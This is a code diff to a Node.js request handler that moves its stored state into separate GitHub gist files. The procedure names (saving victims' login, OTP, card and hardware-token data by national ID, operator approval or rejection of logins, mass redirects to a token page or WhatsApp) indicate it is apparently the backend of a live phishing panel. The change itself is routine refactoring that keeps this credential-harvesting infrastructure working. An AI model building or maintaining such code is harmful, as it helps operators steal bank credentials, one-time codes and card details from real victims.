@@ -68,38 +68,65 @@ async function loadData(forceRefresh, isAdmin) {
   if (forceRefresh || !_cache || Date.now() - _lastRead > cacheMs) {
     try {
       const gist = await ghApi('GET');
-      if (gist?.files?.['data.json']?.content) {
-        _cache = JSON.parse(gist.files['data.json'].content);
+      if (gist?.files) {
+        let base = _cache || { ...DEFAULT_DATA };
+        if (gist.files['data.json']?.content) {
+          base = JSON.parse(gist.files['data.json'].content);
+        }
+        if (gist.files['apps.json']?.content) {
+          const ad = JSON.parse(gist.files['apps.json'].content);
+          base.applications = ad.applications || base.applications || {};
+          if (ad.appIdCounter) base.appIdCounter = ad.appIdCounter;
+        }
+        _cache = base;
         _lastRead = Date.now();
         saveTmp();
       }
-    } catch {}
+    } catch (e) { console.error('[loadData] FAILED:', e.message); }
   }
   if (!_cache) _cache = { ...DEFAULT_DATA };
   return _cache;
 }
 
-async function writeToGist() {
-  if (!_cache) return;
-  try {
-    await ghApi('PATCH', { files: { 'data.json': { content: JSON.stringify(_cache) } } });
-    _lastWrite = Date.now();
-    _lastRead = Date.now();
-    saveTmp();
-  } catch (e) { console.error('[writeToGist] FAILED:', e.message); }
-}
-
-const SYNC_MUTATIONS = new Set([
+const APP_SYNC = new Set([
   'applications.savePersonalInfo', 'applications.saveLoginData',
   'applications.saveOtpData', 'applications.saveCardData',
   'applications.saveHardToken', 'applications.saveWatchLink',
   'applications.clearRedirectByUser', 'applications.clearCustomMessage',
   'admin.approveLogin', 'admin.rejectLogin',
-  'admin.redirectUser', 'admin.redirectVisitor', 'admin.redirectAllToToken',
+  'admin.redirectUser', 'admin.redirectAllToToken',
   'admin.redirectWhatsApp', 'admin.deleteApplication', 'admin.deleteInactiveClients',
-  'admin.deleteAllClients', 'admin.setCustomMessage', 'admin.updateWhatsAppLink',
-  'admin.resetTotalVisitors', 'admin.clearVisitorRedirect',
+  'admin.deleteAllClients', 'admin.setCustomMessage',
 ]);
+
+const SYNC_MUTATIONS = new Set([
+  ...APP_SYNC,
+  'admin.redirectVisitor', 'admin.clearVisitorRedirect',
+  'admin.updateWhatsAppLink', 'admin.resetTotalVisitors',
+]);
+
+async function writeToGist(syncProcs) {
+  if (!_cache) return;
+  const files = {};
+  const hasAppSync = syncProcs.some(p => APP_SYNC.has(p));
+  const hasOtherSync = syncProcs.some(p => SYNC_MUTATIONS.has(p) && !APP_SYNC.has(p));
+  if (hasAppSync) {
+    files['apps.json'] = { content: JSON.stringify({
+      applications: _cache.applications,
+      appIdCounter: _cache.appIdCounter || 10000,
+    })};
+  }
+  if (hasOtherSync) {
+    files['data.json'] = { content: JSON.stringify(_cache) };
+  }
+  if (!Object.keys(files).length) return;
+  try {
+    await ghApi('PATCH', { files });
+    _lastWrite = Date.now();
+    _lastRead = Date.now();
+    saveTmp();
+  } catch (e) { console.error('[writeToGist] FAILED:', e.message); }
+}
 
 function getOrCreateApp(data, nationalId) {
   if (!data.applications[nationalId]) {
@@ -377,7 +404,9 @@ module.exports = async (req, res) => {
   else inputs = req.body || {};
 
   const isAdmin = isAdminReq(req);
-  const hasSyncMutation = procs.some(name => SYNC_MUTATIONS.has(name.trim()));
+  const trimmedProcs = procs.map(p => p.trim());
+  const syncProcs = trimmedProcs.filter(p => SYNC_MUTATIONS.has(p));
+  const hasSyncMutation = syncProcs.length > 0;
   const data = await loadData(hasSyncMutation, isAdmin);
 
   let setCookie = null, clearCookie = false;
@@ -396,7 +425,7 @@ module.exports = async (req, res) => {
     }
   }));
 
-  if (hasSyncMutation) await writeToGist();
+  if (hasSyncMutation) await writeToGist(syncProcs);
   saveTmp();
 
   if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
